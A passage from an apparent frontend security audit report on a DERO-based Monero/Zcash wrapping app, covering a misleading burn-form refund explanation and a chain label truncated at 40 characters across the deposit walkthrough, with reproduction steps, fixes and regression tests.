- **Reproduced** yes — $ sed -n '375,402p' contracts/vault.bas    # no SIGNER() anywhere in Burn; refund is a parameter $ sed -n '483p' app/wrap.js   scid: w.scid, entry: "Burn", args: [["dest", "S", dst], ["refund", "S", me()]], asset: {...} Screenshot .sim/ui-audit-frontend/02-wrap.png, WITHDRAW section, shows the sentence in place.
- **Fix** Correct the copy: ring 2 is chosen so that a refused Burn returns the attached units to a signer, not because the contract records the burner. Offer the refund address as a field defaulting to the connected wallet, with a one-line statement that whatever is typed there is published on DERO beside the destination. Local; the contract already supports it.
- **Regression test** A UI-pass assertion that the burn form contains a refund-address field and that the string "the contract must record who burned" is gone.
- **Safe to fix now** yes · files: app/wrap.js
- **Already known as** SEC-RT-08 in FINDINGS.md is open and covers the copy. The second half - that the app forecloses the contract's own option - is not recorded.
- **Refuter verdicts** UNVERIFIED (the refuters for this dimension did not run)

### FE-10 — The vault's chain label is truncated mid-word and repeats broken through the whole deposit walkthrough

- **Where** `app/wrap.js:203 (U.clean(a.chain, 40)) against app/config.js:11-14:203` (dimension: TELA, frontend, wallet interaction, supply chain (directive §15, §16, §26, §35))
- **Attack path** wrap.js:203 caps the vault's `chain` string at 40 characters. The shipped simulator record is "Monero - simulated on this network (12 decimals, as Monero)", 58 characters, so every use renders "Monero - simulated on this network (12 d". It is interpolated into roughly a dozen sentences on the screen, including the deposit-address heading and the confirmation step.
- **Preconditions** Any vault whose config `chain` string exceeds 40 characters - which is both shipped simulator vaults and both legacy ones.
- **Impact** The screen a user reads immediately before sending unrecoverable Monero or Zcash reads as corrupted text, in eleven places. Nothing is wrong with the values, but a user who cannot trust the rendering has no way to tell which parts to trust.
